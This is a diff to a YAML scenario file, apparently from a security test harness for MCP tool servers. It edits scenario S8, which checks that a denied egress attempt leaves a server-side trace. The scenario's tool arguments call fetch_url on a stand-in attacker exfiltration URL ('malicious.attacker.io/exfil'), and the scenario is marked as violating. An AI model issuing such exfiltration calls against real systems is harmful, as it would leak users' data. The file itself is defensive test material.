@@ -121,19 +121,20 @@ scenarios:
       resource_uri: "tool-integrity://hash"
 
   - id: S8
-    description: "Synthetic observability-gap injection: denial event occurs but no server-side trace artifact is produced (benchmarked injection, not an organic runtime signal)"
+    description: "Observability gap: real egress denial occurs but server is configured not to emit the denial trace artifact"
     transport: http
     violating: true
     component: observability
     lifecycle_phase: observability
     failure_mode: missing_server_trace
     evidence_kind: observability_gap
-    url: "http://127.0.0.1:8001/mcp"
+    url: "http://127.0.0.1:8003/mcp"
     headers: {}
     tool: fetch_url
     tool_args:
       url: "https://malicious.attacker.io/exfil"
     observability_check: true
+    server_trace_dir: "evidence/server_traces_s8"
 
   # --- DIVERGENCE SCENARIOS (expose gap between modes) ---
 
